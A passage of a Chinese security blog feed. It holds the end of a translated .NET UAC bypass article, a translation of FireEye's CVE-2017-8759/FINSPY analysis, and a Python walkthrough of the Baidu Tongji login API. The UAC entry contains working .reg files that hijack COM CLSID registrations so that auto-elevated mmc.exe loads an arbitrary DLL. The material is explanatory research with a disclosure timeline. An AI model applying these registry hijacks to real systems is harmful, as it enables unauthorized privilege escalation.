<li>托管DLL的Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactor组件</li> </ol> <p><img src="/img/net-bypass-uac-7.png" alt="net-bypass-uac-7.png"><br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;]</span><br><span class="line">@=&quot;Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\Implemented Categories]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\Implemented Categories\&#123;62C8FE65-4EBB-45e7-B440-6E39B2CDBF29&#125;]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\InprocServer32]</span><br><span class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</span><br><span class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</span><br><span class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</span><br><span class="line">&quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot;</span><br><span class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</span><br><span class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\InprocServer32\3.0.0.0]</span><br><span class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</span><br><span class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</span><br><span class="line">&quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot;</span><br><span class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</span><br></pre></td></tr></table></figure></p> <ol> <li>Native DLL的NDP SymBinder组件，劫持\Server项</li> </ol> <p><img src="/img/net-bypass-uac-8.png" alt="net-bypass-uac-8.png"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;]</span><br><span class="line">@=&quot;NDP SymBinder&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InprocServer32]</span><br><span class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</span><br><span class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InprocServer32\4.0.30319]</span><br><span class="line">@=&quot;4.0.30319&quot;</span><br><span class="line">&quot;ImplementedInThisVersion&quot;=&quot;&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\ProgID]</span><br><span class="line">@=&quot;CorSymBinder_SxS&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\Server]</span><br><span class="line">@=&quot;C:\\Temp\\test_unmanaged.dll&quot;</span><br></pre></td></tr></table></figure> <ol> <li>Native DLL的Microsoft Common Language Runtime Meta Data组件，劫持\Server项（只有secpol.msc可用）</li> </ol> <p><img src="/img/net-bypass-uac-9.png" alt="net-bypass-uac-9.png"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;]</span><br><span class="line">@=&quot;Microsoft Common Language Runtime Meta Data&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\InprocServer32]</span><br><span class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</span><br><span class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\InprocServer32\4.0.30319]</span><br><span class="line">@=&quot;4.0.30319&quot;</span><br><span class="line">&quot;ImplementedInThisVersion&quot;=&quot;&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\ProgID]</span><br><span class="line">@=&quot;CLRMetaData.CorRuntimeHost.2&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\Server]</span><br><span class="line">@=&quot;..\\..\\..\\..\\Temp\\test_unmanaged.dll&quot;</span><br></pre></td></tr></table></figure> <p>（注意：路径必须是相对的，否则mmc.exe会尝试加载C:\Windows\Microsoft.NET\Framework64\v4.0.30319\C:\Temp\test_unmanaged.dll）</p> <h1 id="不是安全边界"><a href="#不是安全边界" class="headerlink" title="不是安全边界"></a>不是安全边界</h1><p>微软多次申明UAC不是一个安全边界，安全从业者以更务实的角度来看它：不要信任UAC，不要用admin运行，用非admin用户运行不需要admin的任务，我非常赞同这种说法。</p> <p>但是依然很多人用admin运行所有的东西，他们都是渗透测试人员和红色组织（都是坏人）感兴趣的目标。所以我猜测还会有新的关于UAC的有趣技术。</p> <p>如果为了渗透测试，我推荐使用<a href="https://tyranidslair.blogspot.fr/2017/05/reading-your-way-around-uac-part-1.html" target="_blank" rel="noopener">@tiraniddo的例子</a>（<a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1" target="_blank" rel="noopener">一个已经实现</a>，<a href="https://twitter.com/enigma0x3/status/907397236627329024" target="_blank" rel="noopener">另一个也快来了</a>），它不需要加载DLL，并且目前大部分EDR解决方案还不能捕获它。</p> <p>另外，如果你也在研究绕过UAC，这个主题外有很多资源，但是下面的必须读一下：</p> <ul> <li>@enigma0x3’s research (and his upcoming DerbyCon talk)</li> <li>@tiraniddo’s bypass techniques on UAC via the SilentCleanup task and process token reading: part 1, part 2 &amp; part 3</li> <li>@hFireF0X’s UACME project that implements most known UAC bypasses, and his posts on kernelmode</li> <li>@FuzzySec’s UAC workshop, and his Bypass-UAC project that implements several bypasses in PowerShell</li> </ul> <p>非常感谢Casey Smith(<a href="https://twitter.com/subTee" target="_blank" rel="noopener">@subtee</a>)指出.NET profiler DLL技巧，并且感谢对微软开发者找到根本原因给予的帮助，谢谢Matt Graeber (<a href="https://twitter.com/mattifestation/" target="_blank" rel="noopener">@mattifestation</a>) 的意见和review。</p> <h1 id="进展时间"><a href="#进展时间" class="headerlink" title="进展时间"></a>进展时间</h1><p>2017-05-19 发现bypass<br>2017-05-20 给MSRC发邮件 (cc’ing an MS dev as suggested by @mattifestation)<br>2017-05-22 MSRC创建主题 #38811<br>2017-05-20/23 和 MS dev讨论<br>2017-06-24  MSRC回复: “We have finished our investigation and determined this does not meet the bar for servicing downlevel. UAC is not a security boundary.”<br>2017-07-05 Stefan Kanthak绕过方案的完整披露<br>2017-09-15 发表本篇文章</p> <p>文章来源：<a href="https://offsec.provadys.com/UAC-bypass-dotnet.html" target="_blank" rel="noopener">https://offsec.provadys.com/UAC-bypass-dotnet.html</a></p> ]]></content>          <summary type="html">            &lt;p&gt;.NET框架可以通过用户自定义环境变量和CLSID注册表项来加载profiler DLL或者COM组件DLL，甚至当前进程是提权的。这种行为可以被利用来绕过Windows 7到10（包括最近的RS3）系统的默认UAC设置，如通过自动提权.NET进程（MMC管理单元）来加载任意的DLL。&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="bypassUAC" scheme="https://anhkgg.github.io/tags/bypassUAC/"/>            <category term="UAC" scheme="https://anhkgg.github.io/tags/UAC/"/>            <category term=".NET" scheme="https://anhkgg.github.io/tags/NET/"/>            <category term="mmc.exe" scheme="https://anhkgg.github.io/tags/mmc-exe/"/>        </entry>      <entry>     <title>翻译：FireEye揭露CVE-2017-8759：分发FINSPY的0day</title>     <link href="https://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/"/>     <id>https://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/</id>     <published>2017-09-14T02:12:47.000Z</published>     <updated>2017-09-14T02:26:09.266Z</updated>          <content type="html"><![CDATA[<p>2017.9.12 | by Genwei Jiang, Ben Read, Tom Bennett | Threat Research</p> <p>FIreEye近期检测到一个恶意的利用CVE-2017-8759漏洞的微软Office RTF文档。</p> <p>CVE-2017-8759是SOAP WSDL分析器代码注入漏洞，在解析SOAP WSDL定义的内容中它允许攻击者注入任意代码。</p> <p>FireEye分析了这个攻击者使用的微软Word文档，它利用任意代码注入来下载和执行一个包含PowerShell命令的VB脚本。</p> <a id="more"></a> <p>FireEye将这个漏洞的细节分享给了微软，然后协调了信息披露的时间，发布了修补该漏洞的补丁和安全指导，可以在这里找到它们。</p> <p>FireEye的邮件，终端以及网络产品都已经可以检测该恶意文档。</p> <h1 id="针对俄语目标的漏洞"><a href="#针对俄语目标的漏洞" class="headerlink" title="针对俄语目标的漏洞"></a>针对俄语目标的漏洞</h1><p>该恶意文档（Проект.doc）（MD5：fe5c4d6bb78e170abf5cf3741868ea4c）可能是针对俄语目标的。</p> <p>在CVE-2017-8759利用成功之后，该文档会下载多个组件（后面有详情），最终会加载一个FINSPY payload（MD5：a7b990d5f57b244dd17e9a937a41e7f5）。</p> <p>FINSPY恶意软件，也叫做FinFisher或者WingBird，是可以购买的用于“合法窃听”的软件。基于这个和之前FINSPY的使用，我们有更多的信心说这个恶意文档是一个针对俄语目标的网络间谍活动。</p> <p>根据FireEye动态威胁情报系统的更多的检测，根据不同client的行为关联，发现该样本在2017年7月就已经出现了。</p> <h1 id="CVE-2017-8759-WSDL-解析器代码注入"><a href="#CVE-2017-8759-WSDL-解析器代码注入" class="headerlink" title="CVE-2017-8759 WSDL 解析器代码注入"></a>CVE-2017-8759 WSDL 解析器代码注入</h1><p>代码注入漏洞是存在于WSDL解析模块的PrintClientProxy方法中（<a href="http://referencesource.microsoft.com/" target="_blank" rel="noopener">http://referencesource.microsoft.com/</a> - System.Runtime.Remoting/metadata/wsdlparser.cs,6111）。</p> <p>IsValidUrl没有对提供的包含CRLF序列（换行回车）的数据进行正确的校验，这就允许了攻击者注入和执行任意代码。部分漏洞代码如图1所示。</p> <p><img src="/img/fireeye-CVE-2017-8759-1.png" alt="图1. WSDL解析器的漏洞"></p> <p>当在SOAP响应中多个address被定义时，代码会在第一个地址后插入“//base.ConfigureProxy(this.GetType(),”字符串，注释了后面剩余的address。然而，如果恶意的address的还有一个CRLF，后面的代码就不会被注释。</p> <p>图2展示了对CRLF缺乏验证，System.Diagnostics.Process.Start方法会被注入。生成的代码会被.NET框架的csc.exe编译，然后作为DLL加载到Office可执行程序中。</p> <p><img src="/img/fireeye-CVE-2017-8759-2.png" alt="图2. SOAP定义和产生的代码"> </p> <h1 id="在外散播的攻击"><a href="#在外散播的攻击" class="headerlink" title="在外散播的攻击"></a>在外散播的攻击</h1><p>FireEye检测到在外散播的攻击使用的是富文本(RTF)格式的文档，和我们之前报告的CVE-2017-0199文档类似。</p> <p>该恶意样本包含一个是利用更方便的嵌入的SOAP Moniker，如图3所示。</p> <p><img src="/img/fireeye-CVE-2017-8759-3.png" alt="图3. SOAP Moniker"> </p> <p>样本从一个攻击者控制的服务器接收恶意的SOAP WSDL定义的数据。.NET框架中System.Runtime.Remoting.ni.dll中实现的WSDL解析器会解析内容然后生成一个.cs源代码到工作目录中。</p> <p>接着.NET框架的csc.exe编译该代码生成一个名字像http[url path].dll的库文件。然后微软的Office会加载这个库，完成漏洞利用。图4展示了漏洞利用加载的示例库文件。</p> <p><img src="/img/fireeye-CVE-2017-8759-4.png" alt="图4. 被加载的DLL">  </p> <p>在成功的利用中，注入的代码会创建一个新的进程，利用mshta.exe会从同一个服务器接收一个叫做“word.db”的HTA脚本。</p> <p>HTA脚本会从磁盘删除源代码，编译的DLL和PDB文件，然后下载执行叫做“left.jpg”的FINSPY恶意软件，虽然它是.jpg后缀名，类型是image/jpeg，但其实是个可执行文件。</p> <p>图5展示了恶意软件传输的PCAP细节。</p> <p><img src="/img/fireeye-CVE-2017-8759-5.png" alt="图5. 实时的请求"> </p> <p>该恶意软件会被放在%appdata%\Microsoft\Windows\OfficeUpdte-KB[ 6 random numbers ].exe中。图6展示了在Process Monitor中的进程创建链。</p> <p><img src="/img/fireeye-CVE-2017-8759-6.png" alt="图6. 进程创建链"> </p> <h1 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a>恶意软件</h1><p>Left.jpg (md5: a7b990d5f57b244dd17e9a937a41e7f5)是FINSPY的变体。它利用高强度的混淆代码开发了一个内置虚拟机以及其他的一些反分析技术，来增加逆向的难度。比如另个月单独的反分析技术是，它会解析自己的全路径，然后搜索是否存在他自己的MD5哈希字符串。很多分析工具和沙箱为了能保证准确的唯一文件名会重命名样本文件为MD5哈希。该样本会使用WininetStartupMutex0的mutex来保证单实例。</p> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CVE-2017-8759是2017年FireEye发现的第二个分发FINSPY的0day。这个揭露说明签名资源对“合法窃听”的公司和他们用户都是可用的。此外，FINSPY买了多个不同的客户端，漏洞可以用于攻击其他的目标。</p> <p>CVE-2017-8759可能已经被更多的攻击者利用了。尽管我们没有证据，但是在2017年7月分析中，CVE-2017-0199已经被金融攻击者用来分发FINSPY。如果FINSPY的攻击者有之前使用的相同源码的漏洞，那么可能代码已经被卖给了更多的攻击者。</p> <h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>感谢Dhanesh Kizhakkinan, Joseph Reyes, FireEye Labs Team, FireEye FLARE Team and FireEye iSIGHT Intelligence发布这个博客。同样感谢MSRC协助解决这个问题的工作人员。</p> <p>参考：<a href="http://blog.sina.com.cn/s/blog_67ae918d0102e1l9.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_67ae918d0102e1l9.html</a></p> <p>文章来源：<br><a href="https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html" target="_blank" rel="noopener">https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html</a></p> <p>转载请注明：<a href="http://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/">http://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/</a></p> ]]></content>          <summary type="html">            &lt;p&gt;2017.9.12 | by Genwei Jiang, Ben Read, Tom Bennett | Threat Research&lt;/p&gt; &lt;p&gt;FIreEye近期检测到一个恶意的利用CVE-2017-8759漏洞的微软Office RTF文档。&lt;/p&gt; &lt;p&gt;CVE-2017-8759是SOAP WSDL分析器代码注入漏洞，在解析SOAP WSDL定义的内容中它允许攻击者注入任意代码。&lt;/p&gt; &lt;p&gt;FireEye分析了这个攻击者使用的微软Word文档，它利用任意代码注入来下载和执行一个包含PowerShell命令的VB脚本。&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="FireEye" scheme="https://anhkgg.github.io/tags/FireEye/"/>            <category term="cve20178759" scheme="https://anhkgg.github.io/tags/cve20178759/"/>            <category term="FINSPY" scheme="https://anhkgg.github.io/tags/FINSPY/"/>        </entry>      <entry>     <title>pylogin系列之搞定百度统计</title>     <link href="https://anhkgg.github.io/pylogin-baidutongji-login-analyze/"/>     <id>https://anhkgg.github.io/pylogin-baidutongji-login-analyze/</id>     <published>2017-08-21T16:01:25.000Z</published>     <updated>2017-08-22T05:31:17.910Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这次分析的百度统计登录接口，算是这几个中最简单的了。</p> <p>但是学到了一个新东西，叫做js模板，搞web的同学应该知道，我这种web半吊子第一次见，非常有意思。</p> <a id="more"></a> <p>工具：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. chrome/firefox</span><br><span class="line">2. f12，network</span><br><span class="line">3. python：requests、re</span><br></pre></td></tr></table></figure> <h1 id="登录接口"><a href="#登录接口" class="headerlink" title="登录接口"></a>登录接口</h1><p>打开百度统计首页<code>https://tongji.baidu.com/web/welcome/login</code>，点开登录框，f12。尝试输入之后，查看发送的数据。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Request URL:https://cas.baidu.com/?action=login</span><br><span class="line">Request Method:POST</span><br><span class="line">Status Code:200 OK</span><br><span class="line"></span><br><span class="line">appscope[]:6</span><br><span class="line">appscope[]:7</span><br><span class="line">appscope[]:12</span><br><span class="line">appid:12</span><br><span class="line">entered_login:anhkgg //名字</span><br><span class="line">entered_password:1111111111111111 //密码</span><br><span class="line">entered_imagecode:9mxm //验证码</span><br><span class="line">charset:utf-8</span><br><span class="line">fromu:https://tongji.baidu.com/web/welcome/loginback</span><br><span class="line">selfu:https://tongji.baidu.com/web/welcome/login</span><br><span class="line">senderr:1</span><br></pre></td></tr></table></figure> <p>除了上面注释的需要输入的三个字段，其他字段意义都不明确，偷点懒，多次尝试后发现其他字段不会变化，那么就用固定值了。</p> <p>点击验证码，看到网络，拿到获取验证码的请求，key使用10位时间戳。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https://cas.baidu.com/?action=image&amp;key=1503151305</span><br></pre></td></tr></table></figure> <p>所以登录接口就出来了，<code>vcode</code>需要人工输入。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">url = &apos;https://cas.baidu.com/?action=image&amp;key=&apos; + time_stamp(10)</span><br><span class="line">r = self.s.get(url)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &apos;appscope[]&apos;:6,</span><br><span class="line">    &apos;appscope[]&apos;:7,</span><br><span class="line">    &apos;appscope[]&apos;:12,</span><br><span class="line">    &apos;appid&apos;:12,</span><br><span class="line">    &apos;entered_login&apos;:name,</span><br><span class="line">    &apos;entered_password&apos;:pwd,</span><br><span class="line">    &apos;entered_imagecode&apos;:vcode,</span><br><span class="line">    &apos;charset&apos;:&apos;utf-8&apos;,</span><br><span class="line">    &apos;fromu&apos;:&apos;https://tongji.baidu.com/web/welcome/loginback&apos;,</span><br><span class="line">    &apos;selfu&apos;:&apos;https://tongji.baidu.com/web/welcome/login&apos;,</span><br><span class="line">    &apos;senderr&apos;:1,</span><br><span class="line">    &#125;        </span><br><span class="line">url = &apos;https://cas.baidu.com/?action=login&apos;</span><br><span class="line">r = self.s.post(url, data = payload)</span><br></pre></td></tr></table></figure> <p>接着看看登录返回状态，如果失败了，返回数据中包含如下数据：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;ReFresh&quot; content=&quot;0; url=https://tongji.baidu.com/web/welcome/login?fromu=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback&amp;e=%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF&amp;un=anhkgg&amp;aid=12&amp;errno=132&quot; /&gt;</span><br><span class="line">&lt;title&gt;正在处理...&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;                </span><br><span class="line">    var url=&quot;https://tongji.baidu.com/web/welcome/login?fromu=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback&amp;e=%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF&amp;un=anhkgg&amp;aid=12&amp;errno=132&quot;;</span><br><span class="line">    location.href=url;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure> <p>然后浏览器加载该url，显示错误提示信息</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Request URL:https://tongji.baidu.com/web/welcome/login?fromu=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback&amp;e=%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF&amp;un=anhkgg&amp;aid=12&amp;errno=132</span><br><span class="line">Request Method:GET</span><br><span class="line"></span><br><span class="line">fromu:https://tongji.baidu.com/web/welcome/loginback</span><br><span class="line">e:用户名密码错误</span><br><span class="line">un:anhkgg</span><br><span class="line">aid:12</span><br><span class="line">errno:132</span><br></pre></td></tr></table></figure> <p>其中<code>e</code>是错误提示信息，errno是错误号。</p> <p>登录成功返回数据如下，没有<code>e</code>错误信息。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;                </span><br><span class="line">var url=&quot;http://cas.baidu.com/?action=check&amp;appid=12&amp;u=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback%3Fcastk%3Dc4086gh7e82166251d451&amp;fromLogin=1&quot;;</span><br><span class="line">location.href=url;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure> <p>那么就可以先通过正则拿到url，通过搜索url是否有<code>e</code>判断是否登录成功，并且拿到提示信息。成功则继续访问该url跳转到成功页面，获取其他需要的信息。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(r&apos;var url=&quot;(.*?)&quot;;&apos;)</span><br><span class="line">cont = re.search(pattern, r.content)</span><br><span class="line">url = cont.group(1)</span><br><span class="line">pattern = re.compile(r&apos;e=(.*?)&amp;un=&apos;)</span><br><span class="line">cont = re.search(pattern, url)</span><br><span class="line">if cont != None:</span><br><span class="line">    r = urllib.unquote(cont.group(1)) #失败</span><br><span class="line">    return utf2gbk(r)        </span><br><span class="line"></span><br><span class="line">r = self.s.get(url) # 成功</span><br></pre></td></tr></table></figure> <h1 id="js模板"><a href="#js模板" class="headerlink" title="js模板"></a>js模板</h1><p>这里比较意思的是使用的js模板来生成登录表单。</p> <p>具体js模板使用看<a href="http://freshflower.iteye.com/blog/2120268" target="_blank" rel="noopener">这里</a>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;script id=&quot;LoginTemplate&quot; type=&quot;text/template&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id=&quot;LoginContainer&quot; class=&quot;login-dialog&quot;&gt;</span><br><span class="line">        &lt;div id=&quot;TopTmp&quot;&gt;&amp;nbsp;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        if (this.isIco == 1) &#123;</span><br><span class="line">        &lt;div id=&quot;LoginMain&quot; class=&quot;ico-login clearfix&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;visitor-login-tab&quot; id=&quot;LoginTab&quot;&gt;请输入查看密码&lt;/div&gt;</span><br><span class="line">            &lt;div id=&quot;LoginInput&quot; class=&quot;login-input&quot;&gt;</span><br><span class="line">                if (this.errMsg) &#123;</span><br><span class="line">                &lt;div id=&quot;ErrorTip&quot; class=&quot;error&quot;&gt;#&#123;this.errMsg&#125;&lt;/div&gt;</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">        &lt;div id=&quot;LoginMain&quot; class=&quot;login-main&quot;&gt;</span><br><span class="line">            </span><br><span class="line">                &lt;form method=&quot;post&quot; action=&quot;#&#123;this.loginAction&#125;&quot;&gt;</span><br><span class="line">                    &lt;input type=&quot;hidden&quot; value=&quot;12&quot; id=&quot;Appid&quot; name=&quot;appid&quot;&gt;</span><br><span class="line">                    ...</span><br><span class="line">                    &lt;input type=&quot;hidden&quot; value=&quot;#&#123;this.selfUrl&#125;&quot; name=&quot;selfu&quot; /&gt;</span><br><span class="line">                    &lt;input type=&quot;hidden&quot; value=&quot;1&quot; name=&quot;senderr&quot; /&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;dialog-bottom-bg&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure> <p>从上面代码中可以看到，某些标签的值使用了<code>#{this.xxx}</code>这样的语法，不是直接填入的具体内容，更加灵活，扩展更容易。</p> 